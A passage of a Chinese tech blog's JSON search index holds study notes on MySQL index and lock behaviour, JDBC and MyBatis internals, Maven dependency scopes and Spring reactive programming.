","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:4","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"MySQL 目前提供了一下 4 中索引： B-Tree HASH R-Tree：空间索引，主要用于地理空间数据类型 Full-text：全文索引 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:5","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"存在索引但不能使用索引的典型场景： 以%开头的 LIKE 查询不能利用 B-tree 索引。 数据类型中出现隐式类型转换的时候也不会使用索引，特别是当列类型是字符串，那么一定要在 where 条件中把字符常量值用引号引起来 复合索引的情况下，不满足最左原则是不会使用索引的 如果 MySQL 估计使用索引比全表扫描更慢，则不使用索引 用 or 分割开的条件，如果 or 前的条件中的列有索引，而后面的列没有索引，那么涉及的索引都不会被用到。因为 or 后面的条件列中没有索引，那么后面的查询肯定要走全表扫描，在存在全表扫描的情况下，就没有必要多一次索引扫描增加 IO 访问。 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:6","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"两个简单实用的优化方法： 定期分期表和检查表 分析表： analyze table tablename 检查表： check table tablename 定期优化表 optimize table tablename 要在数据库不繁忙的时候执行相关操作 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:7","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"优化 INSERT 语句： 尽量使用多个值表的 INSERT 语句 如果从不同客户插入很多行，可以通过 INSERT DELAYED 语句得到更高的速度。 当从文本文件装载一个表时，使用 LOAD DATA INFILE ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:8","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"优化 ORDER BY 语句 mysql 有两种排序方式 通过有序索引直接返回有序数据 对返回的数据进行排序，也就是常说的 Filesort 排序 所以，尽量减少额外的排序，通过索引直接返回有序数据。where 和 order by 使用相同的索引，并且 order by 的顺序和索引的顺序相同，并且 order by 的字段都是升序或都是降序。 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:9","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"优化 GROUP BY 语句 group by 会默认排序，通过 order by null 可以禁止排序 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:10","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"优化分页查询 第一种优化思路 这是全表扫描： select id,desc from film order by titile limit 50,5; 在索引上完成分页操作，最后根据主键关联回原表查询所需的其他列内容： select a.id,a.desc from file a inner join (select id from file order by title limit 50,5)b on a.id=b.id; 这种方式让 MySQL 扫描尽可能少的页面来提高分页效率 第二种优化思路 把 limit 查询转换为某个位置的查询，把 LIMIT m,n 转换为 LIMIT n ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:11","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"直方图 利用直方图，用户可以对一张表的一列做数据分布的统计，特别是针对没有索引的字段。主要场景是用来计算字段选择性，即过滤效率。 可以帮助优化器找到更优的执行计划。 生成直方图： analyze table tbname update histogram on clo_name [,col_name] [with n buckets]; 删除直方图： analyze table tbname drop histogram on clo_name [,col_name]; 直方图的分离： 等宽直方图 等高直方图 列中不同值得个数小于等于 bucket 数，则为等宽直方图，否则为等高直方图 并不是所有大表的字段都需要创建直方图。通常在一些唯一值较少，数据分布不均衡，查询较为频繁，没有创建索引的字段上考虑创建直方图。虽然创建索引有时也可以达到优化效果，但由于使用率低，索引维护成本高，故通常不会创建索引 直方图只需要创建一次，对数据的变更不需要实时进行维护，代价较小，更适合此类查询。 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:12","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"利用 group by 的 with rollup 子句 with rollup 反映的是一种 OLAP 思想，就是说这个 group by 语句完成后可以满足用户想要得到的任何一个分组以及分组组合的聚合信息值。 当使用 rollup 时，不能同时使用 order by 字句进行排序。此外，limit 要在 rollup 后面。 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:13","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"大小写问题 在大多数 UNIX 环境中，由于操作系统对大小写敏感，导致数据库名和表名大小写敏感，而 Windows 则不敏感。 列，索引，存储子程序和触发器在任何平台都对大小写不敏感。默认情况下，表别名在 UNIX 中大小写敏感，在 windows 或 maxOS X 中大小写不敏感。 最好统一用小写。 MySQL 有两种锁：共享读锁，独占写锁。 在 5.7 及以前，用select ... in share mode获取共享锁，8.0 后改为select for share，兼容以前的。 用select for update获取独占锁。如遇到锁等待，默认等 50s，可以在 update 后加两个选项：skip locked 和 nowait。 innoDb 行锁分 3 种： record lock：对索引项加锁 gap lock：对索引间的间隙加锁 next-key lock：前两种的组合，对记录及前面的间隙加锁 这意味着如果不通过索引检索数据，那么 innoDB 将对表中所有数据加锁，和锁表一样！！ 由于 MySQL 的行锁是针对索引加的锁，不是针对记录加的锁，所以虽然是访问不同的记录，但是如果是使用的相同的索引键，就会出现锁冲突。 当表有多个索引的时候，不同的事务可以使用不同的索引锁定不同的行 即便在条件中使用了索引字段，但是否使用索引来检索数据是由 MySQL 通过判断不同执行计划的代价来决定的。 当使用范围条件检索数据，并请求共享或排他锁时，innoDB 会给符合条件的数据记录的索引项加锁，对于键值在条件范围内但并不存在的记录，叫做间隙，innoDB 也会对这个间隙加锁，这就是next-key锁。 除了通过范围条件外，如果视同相等条件给一个不存在的记录加锁，innoDB 也会使用 next-key 锁。 next-key 可以解决幻读。 insert … select 和 create table … select 可能会阻止对源表的并发更新，MySQL 将这种 sql 称为不确定的 sql， 属于“Unsafe SQL”，不推荐使用。 可以通过\"select * from source into outfile\" 和\"load data infile …“语句来组合间接实现。或使用基于行的 BINLOG 格式和基于行数据的复制。 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:14","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"关于死锁 两个事务都需要获取对方持有的排他锁才能继续完成事务，这种循环锁等待就是典型的死锁。 发生死锁后，innoDB 一般都能自动检测到，并使一个事务释放锁并回退。当涉及外部锁或表锁，innoDB 并不能完全自动检测到死锁，需要设置超时等待参数 innodb_lock_wait_timeout 来解决。 通常来说，死锁都是应用设计的问题 在应用中，如果不同的程序会并发读取多个表，应尽量约定以相同的顺序来访问表，可以大大降低死锁的概率。 在程序以批量方式处理数据的时候，如果实现对数据排序，保证每个线程按固定的顺序来处理记录，也可以大大降低死锁的概率。 在事务中，如果要更新记录，应直接申请排他锁，而不应先申请共享锁再申请排他锁 用 show innodb status 分析死锁的原因 innoDB 采用 redo log 机制来保证事务更新的一致性和持久性。 当更新数据时，innoDB 内部的操作流程大致如下： 将数据读入 innoDB buffer pool，并对 相关记录加独占锁 将 undo 信息写入 undo 表空间的回滚段中 更改缓存页中的数据，并将更新记录写入 redo buffer 中 提交时，根据 innodb_flush_log_at_trx_commit 的设置，用不同的方式将 redo buffer 中的更新记录刷新到 innoDB rego log file 中，然后释放独占锁 最后，后台 IO 线程根据需要择机将缓存中更新的数据刷新到磁盘文件中 set persist/set persist only 可以持久化参数设置，通过 reset persist 来清除某个配置 ","date":"2020-10-03","objectID":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/:2:15","tags":null,"title":"深入浅出MySql笔记","uri":"/2020/10/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAmysql%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Connection 一个 connection 对象表示通过 JDBC 驱动与数据库建立的连接。 我们可以通过两种方式获取 connection 对象： 通过 JDBC API 中提供的 DriverManager 类获取 通过 DataSource 获取 推荐第 2 种方式。 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:0","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"DriverManager 所有的 JDBC 驱动都必须实现 Driver 接口，而且实现类必须包含一个静态初始化代码，在静态初始化代码中向 DriverManager 注册自己的一个实例。 这就是为什么我们使用 JDBC 操作数据库时一般会先加载驱动： Class.forName(\"com.mysql.cj.jdbc.Driver\") JDBC 4.0 以上的版本利用 SPI（Service Provider Interface）机制使得我们不需要显式的如上去加载驱动类。 SPI 是一种动态替换发现的机制，比如有一个接口，都运行时动态地给它添加实现，只需要添加一个实现，SPI 机制在程序运行时就会发现该实现类。 当服务的提供者提供了一种接口的实现后，需要在 classpath 下的META-INF/services目录中创建一个以服务接口命名的文件，这个文件就是实现类。 JDK 中查找服务实现类的工具类是java.util.ServiceLoader。在 DriverManager 类中定义了静态初始化代码，会加载所有的驱动类。 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:1","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"DataSource 使用 DataSource 对象可以提高应用程序的可移植性。我们可以使用 JNDI（Java Naming and Directory Interface）把一个逻辑名称和数据源对象建立映射关系。 JNDI 为应用程序提供了一种通过网络访问远程服务的方式。 executeQuery()：执行一个查询语句，并返回一个ResultSet。 executeUpdate()：执行一个update、insert或者delete语句，返回更新数量。 execute()：可以执行所有操作，当是select操作时，返回true，可以通过getResult()查询结果，其他返回 false，通过 getUpdateCount()返回影响的行数。 另外，execute()可能返回多个结果，可以通过 getMoreResults()获取下一个结果。 PreparedStatement 对象设置的参数在执行后不能被重置，必须显式的调用 clearParameters()方法清除先前设置的值，再为参数重新设置值即可。 CallableStatement接口继承自PreparedStatement接口，在他的基础上增加了调用存储过程并检索调用结果的功能。通过Connection对象的prepareCall()方法得到对象。 在execute(),executeUPdate()中可以接受额外的参数，设置为Statement.RETURN_GENERATED_KEYS，然后在调用Statement对象的getGeneratedKeys()方法获得ResultSet对象，就可以获得自增长的键值了。 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:2","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"ResultSet ResultSet 对象的类型主要体现在两个方面 游标可操作的方式 ResultSet 对象的修改对数据库的影响 后者称为 ResultSet 对象的敏感性。 ResultSet 有 3 种不同的类型 TYPE_FORWARD_ONLY 这种类型的 ResultSet 不可滚动，游标只能向前移动，即只能使用 next()方法，不能使用 previous()方法 TYPE_SCROLL_INSENSITIVE 可滚动的，可以相对移动和绝对移动 当 ResultSet 没有关闭时，ResultSet 的修改对数据库不敏感，也就是说对 ResultSet 的修改不会影响数据库中的记录 TYPE_SCROLL_SENSITIVE 可滚动的，可以相对移动和绝对移动 当 ResultSet 没有关闭时，ResultSet 的修改会影响数据库 默认为第一种类型 rs.getType()可获得 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:3","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"ResultSet 并行性 目前 JDBC 中支持两个级别 CONCUR_READ_ONLY（默认次类型） CONCUR_UPDATABLE rs.getConcurrency()获得 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:4","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"ResultSet 可保持性 调用 Connection 对象的 commit()方法能够关闭当前事务中创建的 ResultSet 对象。ResultSet 的 holdability 属性使得 ResultSet 对象是否关闭 HOLD_CURSORS_OVER_COMMIT CLOSE_CURSORS_AT_COMMIT rs.getHoldability()获得 默认取决于驱动实现 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:5","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"ResultSet 属性设置 ResultSet 的类型、并行性、可保持性等属性可以在调用 Connection 对象的 createStatement()、prepareStatement()、prepareCall()方法时设置 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:6","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"ResultSet 游标移动 ResultSet 对象中维护了一个游标，指向当前数据行。第一次指向数据的第一行。有以下方法操作游标： next() previous() first() last() beforeFirst() afterFirst() relative(int rows) absolute(int row) :row 从 1 开始 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:7","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"DatabaseMetaData 获取： conn.getMetadata(); ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:8","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"事务边界和自动提交 何时开启一个事务是由 JDBC 驱动或数据库隐式决定的。 Connection 对象的autoCommit属性决定什么时候结束一个事务。启动自动提交后，会在每个 sql 语句执行完毕后自动提交事务。默认是自动提交开启的。通过setAutoCommit()方法设置。禁用后要手动调用Connection接口提供的commit()方法或rollback()方法 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:9","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"事务隔离级别 数据并发访问可能会出现以下几种问题： 脏读：发生在事务中允许读取未提交的数据。如，A 事务修改了一条数据，但是未提交，此时 A 事务对数据的修改对其他事务是可见的，B 事务中能够读取 A 事务中未提交的修改。一旦 A 事务回滚，B 事务获取的就是不正确的数据。 不可重复读：发生在如下场景 A 事务中读取一行数据 B 事务中修改了该行数据 A 事务中再次读取该行数据将得到不同结果 幻读：发生在如下场景 A 事务中通过 WHERE 条件读取若干行 B 事务中插入了符合条件的若干条数据 A 事务中通过相同的条件再次读取数据时将会读取到 B 事务中插入的数据 事务隔离级别： TRANSACTION_NONE： 表示不支持事务 TRANSACTION_READ_UNCOMMITTED： 允许读取未提交更改的数据 TRANSACTION_READ_COMMITTED： 可以防止脏读 TRANSACTION_REPEATABLE_READ： 可以解决脏读和不可重复读 TRANSACTION_SERIALIZABLE： 可以解决脏读、不可重复读、幻读，但是并发效率低 默认事务级别由 JDBC 驱动指定。可以通过 setTransactionIsolation()方法设置。 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:10","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"事务中的保存点 保存点通过在事务中标记一个中间的点来对事务进行更细粒度的控制，一旦设置的保存点，事务就可以回滚到保存点，而不影响保存点之前的操作。 setSavepoint()设置保存点，该方法返回一个Savepoint对象，该对象可作为rollback()方法的参数，用于回滚到保存点。 可以通过 releaseSavepoint()方法手动释放保存点，此保存点后的所有保存点也会被释放。 所有保存点在事务提交或回滚之后会自动释放。 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:1:11","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"MyBatis 核心组件 Configuration：用于描述 MyBatis 的主配置信息 MappedStatement：用于描述 Mapper 中的 SQL 配置信息 SqlSession：是 MyBatis 提供的面向用户的 API Executor：是 SQL 执行器 StatementHandler：封装了对 JDBC Statement 对象的操作 ParameterHandler：为参数占位符设置值。 ResultSetHandler：将查询结果转换成 Java 对象 TypeHandler：处理 Java 类型与 JDBC 类型之间的映射。 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:2:0","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"SqlSession 执行 Mapper 的过程 MyBatis 中 Mapper 的配置分为两部分，分别为 Mapper 接口和 Mapper SQL 配置。MyBatis 通过动态代理的方式创建 Mapper 接口垫代理对象，MapperProxy 类中定义了 Mapper 方法执行时的拦截逻辑，通过 MapperProxyFactory 创建代理实例，MyBatis 启动时，会将 MapperProxyFactory 注册到 Configuration 对象中。另外，MyBatis 通过 MappedStatement 类描述 Mapper SQL 配置信息，框架启动时，会解析 MapperSQL 配置，将所有的 MappedStatement 对象注册到 Configuration 对象中。 通过 Mapper 代理对象调用 Mapper 接口中定义的方法时，会执行 MapperProxy 类中的拦截逻辑，将 Mapper 方法的调用转换为调用 SqlSession 提供的 API 方法。在 SqlSession 的 API 方法中通过 Mapper 的 Id 找到对应的 MappedStatement 对象，获取对应的 SQL 信息，通过 StatementHandler 操作 JDBC 的 Statement 对象完成与数据库的交互，然后通过 ResultSetHandler 处理结果，将结果返回给调用者。 ","date":"2020-09-28","objectID":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/:3:0","tags":null,"title":"MyBatis3源码深度解析笔记","uri":"/2020/09/mybatis3%E6%BA%90%E7%A0%81%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"compile 默认就是 compile，什么都不配置也就是意味着 compile。compile 表示被依赖项目需要参与当前项目的编译，当然后续的**测试**，运行周期也参与其中，是一个比较强的依赖。打包的时候通常需要包含进去。 ","date":"2020-09-27","objectID":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/:0:1","tags":null,"title":"Maven依赖中的scope作用域详解","uri":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"test scope 为 test 表示依赖项目仅仅参与测试相关的工作，包括测试代码的编译，执行。比较典型的如 junit ","date":"2020-09-27","objectID":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/:0:2","tags":null,"title":"Maven依赖中的scope作用域详解","uri":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"runntime runntime 表示被依赖项目无需参与项目的编译，不过后期的测试和运行周期需要其参与。与 compile 相比，跳过编译而已，说实话在终端的项目（非开源，企业内部系统）中，和 compile 区别不是很大。比较常见的如 JSR××× 的实现，对应的 API jar 是 compile 的，具体实现是 runtime 的，compile 只需要知道接口就足够了。Oracle jdbc 驱动架包就是一个很好的例子，一般 scope 为 runntime。另外 runntime 的依赖通常和 optional 搭配使用，optional 为 true。我可以用 A 实现，也可以用 B 实现。 ","date":"2020-09-27","objectID":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/:0:3","tags":null,"title":"Maven依赖中的scope作用域详解","uri":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"provided provided 意味着打包的时候可以不用包进去，别的设施(Web Container)会提供。事实上该依赖理论上可以参与编译，测试，运行等周期。相当于 compile，但是在打包阶段做了 exclude 的动作。 ","date":"2020-09-27","objectID":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/:0:4","tags":null,"title":"Maven依赖中的scope作用域详解","uri":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"system 从参与度来说，也 provided 相同，不过被依赖项不会从 maven 仓库抓，而是从本地文件系统拿，一定需要配合 systemPath 属性使用。 ","date":"2020-09-27","objectID":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/:0:5","tags":null,"title":"Maven依赖中的scope作用域详解","uri":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"import 它只使用在中，表示从其它的 pom 中导入 dependency 的配置，例如 (B 项目导入 A 项目中的包配置)： scope 的依赖传递 A–\u003eB–\u003eC。当前项目为 A，A 依赖于 B，B 依赖于 C。知道 B 在 A 项目中的 scope，那么怎么知道 C 在 A 中的 scope 呢？答案是： 当 C 是 test 或者 provided 时，C 直接被丢弃，A 不依赖 C； 否则 A 依赖 C，C 的 scope 继承于 B 的 scope。 ","date":"2020-09-27","objectID":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/:0:6","tags":null,"title":"Maven依赖中的scope作用域详解","uri":"/2020/09/maven%E4%BE%9D%E8%B5%96%E4%B8%AD%E7%9A%84scope%E4%BD%9C%E7%94%A8%E5%9F%9F%E8%AF%A6%E8%A7%A3/"},{"categories":null,"content":"反应式编程 ","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:0","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"反应式特点 即时响应式：系统会即时响应用户请求 回弹性：将故障限制在本地范围内 弹性：可以灵活添加资源和释放资源 消息驱动：消息（或事件）驱动 传统方式：轮询 反应式方式：订阅事件和事件链 ","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:1","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"反应式流 Maven 依赖如下： \u003cgroupId\u003eorg.reactivestreams\u003c/groupId\u003e \u003cartifactId\u003ereactive-stream\u003c/artifactId\u003e \u003cartifactId\u003ereactive-stream-tck\u003c/artifactId\u003e 一些重要接口： public interface Subscriber\u003cT\u003e{ public void onSubScribe(Subscription s); public void onNext(T t); public void onError(THrowable t); public void onComplete(); } public interface Publisher\u003cT\u003e{ public void subscribe(Subscriber\u003c? super T\u003e s); } public interface Subscription{ public void request(long n); public void cancle(); } ","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:2","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Reactor 由 Spring Pivotal 团队开发，建立在反应式流基础上。 依赖如下： \u003cartifactId\u003ereactor-core\u003c/artifactId\u003e \u003cartifactId\u003ereactor-test\u003c/artifactId\u003e Flux:表示 0~n 个元素的反应式流 Mono：表示 0 或 1 个元素的反应式流 ","date":"2020-09-27","objectID":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/:1:3","tags":null,"title":"精通Spring笔记","uri":"/2020/09/%E7%B2%BE%E9%80%9Aspring%E7%AC%94%E8%AE%B0/"},{"categories":null,"content":"Spring Web Reactive Spring Web Reactive 基于于 Spring MVC 相同的基本编程模型。 、 Spring MVC Spring Web Reactive 用途 传统 Web 应用程序 反应式 Web 应用程序 编程模型 具有@RequestMapping 的@Controller 与 Spring MVC 相同 基本 API Servlet API 反应式 HTTP 运行位置 Servlet 容器 Severlet 容器（\u003e3.1）、Netty、Undertow 